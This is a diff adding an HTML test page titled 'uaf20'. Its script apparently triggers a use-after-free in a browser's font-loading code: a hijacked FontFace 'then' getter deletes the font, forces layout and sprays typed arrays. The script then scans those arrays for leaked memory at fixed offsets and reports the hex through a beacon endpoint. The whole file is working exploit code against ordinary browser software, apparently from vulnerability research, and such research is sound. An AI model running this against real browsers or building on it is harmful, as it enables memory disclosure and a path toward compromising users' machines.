@@ -1,0 +1,46 @@
+<!doctype html><meta charset="utf-8"><title>uaf20</title><body><script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function hex8(u,o){var s='';for(var i=0;i<8;i++){s+=('0'+u[o+i].toString(16)).slice(-2)}return s}
+var styleEl=null, firedHere=false, BUF=[], hits=0;
+function alloc8(){ for (var i=0;i<8;i++) BUF.push(new Uint8Array(192)); }
+function scanRound(tag){
+  var found=[];
+  for (var i=0;i<BUF.length;i++){
+    var u=BUF[i]; if (u.__done) continue;
+    if (u[0]||u[0x58]||u[0x68]){ u.__done=1; found.push('b'+i+'-0:'+hex8(u,0)+'-58:'+hex8(u,0x58)+'-68:'+hex8(u,0x68)); }
+  }
+  if (found.length){ hits+=found.length; b('U20-'+tag+'-HIT-'+found.join('|')); }
+}
+function setup(){
+  styleEl=document.createElement('style');
+  styleEl.textContent="@font-face { font-family: m0; src: local(Arial); unicode-range: U+0041; }";
+  document.head.appendChild(styleEl);
+  b('U20-SETUP');
+  firedHere=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if (firedHere) return undefined;
+      firedHere=true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+      alloc8();
+      b('U20-GETTER-SPRAYED-'+BUF.length);
+      return undefined;
+    },
+    set:function(){}
+  });
+  b('U20-LOAD-CALLED');
+  document.fonts.load('1em m0','AB').then(function(){ b('U20-RESOLVED'); scanRound('R'); },
+                                           function(){ b('U20-REJECTED'); scanRound('R'); });
+  var round=0;
+  (function tick(){
+    round++; if (round>24){ scanRound('T'+round); b('U20-DONE-hits-'+hits+'-bufs-'+BUF.length); return; }
+    alloc8(); scanRound('T'+round); setTimeout(tick,4);
+  })();
+}
+function run(){ b('U20-PARSE'); setup(); }
+if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script></body>
